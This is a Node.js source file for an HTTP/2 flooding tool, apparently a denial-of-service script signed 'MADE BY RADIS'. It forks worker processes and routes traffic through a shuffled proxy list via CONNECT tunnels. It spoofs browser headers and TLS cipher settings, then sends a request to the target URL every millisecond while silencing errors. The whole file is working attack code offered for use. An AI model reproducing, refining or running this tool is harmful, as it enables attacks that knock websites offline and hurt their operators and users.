const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
const http = require('http');
const fs = require('fs');
const http2 = require("http2");
const tls = require('tls');


require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (er) {
  //  console.error(er)
});
process.on('unhandledRejection', function (er) {
  //  console.error(er)
});
function shuffleFileLines(filePath) {
    // Читаем содержимое файла в массив строк
    const lines = fs.readFileSync(filePath, 'utf-8').split('\n');

    // Перемешиваем массив строк случайным образом
    for (let i = lines.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lines[i], lines[j]] = [lines[j], lines[i]];
    }

    // Записываем перемешанные строки обратно в файл
    fs.writeFileSync(filePath, lines.join('\n'));
}
if (process.argv.length < 3) {
    console.log("node index.js <host> <time> <threads>");
    process.exit(-1);
} 
console.log('MADE BY RADIS')
shuffleFileLines("proxy.txt")
var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxys = fs.readFileSync("proxy.txt", 'utf-8').toString().split('\n');
const headers3 = {};
if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start flood!');
    startflood(target_url);
}

function randomUserAgent(randomNumber){
    var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomNumber}.0.0.0 Safari/537.36`
    return userAgent;
}
function getRandomIntInclusive(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
}
function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
function startflood(page) {

    const sigalgs = ['ecdsa_secp256r1_sha256',
         'ecdsa_secp384r1_sha384', 
         'ecdsa_secp521r1_sha512',
         'rsa_pss_rsae_sha256',
         'rsa_pss_rsae_sha384', 
         'rsa_pss_rsae_sha512',
         'rsa_pkcs1_sha256',
         'rsa_pkcs1_sha384',
         'rsa_pkcs1_sha512'];
    const cplist = ["ECDHE-ECDSA-AES128-GCM-SHA256", 
        "ECDHE-ECDSA-CHACHA20-POLY1305",
         "ECDHE-RSA-AES128-GCM-SHA256",
         "ECDHE-RSA-CHACHA20-POLY1305",
          "ECDHE-ECDSA-AES256-GCM-SHA384",
          "ECDHE-RSA-AES256-GCM-SHA384",
         "ECDHE-ECDSA-AES128-SHA256", 
         "ECDHE-RSA-AES128-SHA256", 
         "ECDHE-ECDSA-AES256-SHA384",
          "ECDHE-RSA-AES256-SHA384"];

    let SignalsList = sigalgs.join(':');

    let chipers = cplist.join(':')
    const keepAliveAgent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity
    });
    console.log('Start attack!');
    
    const floodInterval = setInterval(() => {
        var proxy = getRandomElement(proxys).replace(/\r/g, "").split(':');
        var parsed = url.parse(page);

        headers3[':authority'] = parsed.host;
        headers3[':method'] = 'GET';
        headers3[':path'] = parsed.path;
        headers3[':scheme'] ='https';
        headers3['upgrade-insecure-requests'] = '1';
        headers3['user-agent'] = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36`;
        headers3['accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
        headers3["accept-encoding"] = "gzip, deflate, br";
        headers3["accept-language"] = "en";		
        headers3["sec-ch-ua-platform"] = "macOS"; 
        headers3["sec-fetch-dest"] = "document";
        headers3["sec-fetch-mode"] = "navigate";
        headers3["sec-fetch-site"] = "none";
        headers3["sec-fetch-user"] = "?1";	
        
        var req = http.request({
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: parsed.host + ":443",
            cipper : chipers,
            agent: keepAliveAgent
        });
        req.on('connect', function (res, socket, head) {
            const session = http2.connect(target_url, {settings:{  
                headerTableSize: 65536,
                maxConcurrentStreams: 30000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false},
                createConnection: () => {
                  return tls.connect({
                    host: parsed.host,
                    servername: parsed.host,
                    secureProtocol: ['TLSv1_1_method','TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                    cipher: chipers,
                    sigalgs : SignalsList,
                    requestCert: true,
                    secureOptions: constants.SSL_OP_NO_TLSv1_2 | constants.SSL_OP_NO_TLSv1_1 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_NO_TICKET | constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | constants.SSL_OP_TLSEXT_PADDING | constants.SSL_OP_ALL ,
                    rejectUnauthorized: true,
                    socket: socket,
                    ALPNProtocols: ['h2']
                  }, () => {
                   
					setInterval(()=>{  
                        const req = session.request(headers3);
						req.setEncoding('utf8');
						req.on('data', (chunk) => {});
						req.on("response", (gb) => {					
							req.close();
						});
							req.end();					
						},1)
                     
					})
				}
			});
		});
		req.end();
    },1000);
}